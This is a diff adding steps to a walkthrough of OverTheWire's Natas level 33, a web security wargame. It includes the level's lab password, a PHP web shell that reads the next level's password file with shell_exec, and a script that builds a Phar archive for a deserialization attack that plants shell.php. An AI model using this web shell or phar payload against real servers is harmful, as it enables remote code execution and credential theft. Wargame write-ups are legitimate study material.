@@ -1758,6 +1758,50 @@ Step 11: After using get password file, Then click Send button, we will get the 
 +  Password :  2v9nDlbSF7jvawaCncr5Z9kSzkmBeoCJ
 + Domain : http://natas33.natas.labs.overthewire.org
 ## Explanation
+Step 1:  Go to Firefox Browser, Then Connect to natas33.natas.labs.overthewire.org, Then login with username and password
+
+Step 2: You will see the page like this
+
+![image](./images-1/image-33.png)
+
+Step 3: Then click view source code, it's a php script
+
+![image](./images-1/image-33-1.png)
+
+
+
+<?php 
+echo shell_exec('cat /etc/natas_webpass/natas34');
+?>
+
+
+
+
+
+
+
+
+
+
+<?php
+class Executor
+{
+    private $fiilename = "shell.php";
+    private $signature = True;
+    private $init = False;
+}
+$phar = new Phar('natas.phar');
+$phar->startBuffering();
+$phar->addFromstring('test.txt', 'test');
+$phar->setStub('<?php __HALT_COMPILER(); ?>');
+
+$object = new Executor();
+$object ->data = 'rips';
+$phar ->setMetadata($object);
+$phar->stopBuffering();
+
+?>
+
 
 
 
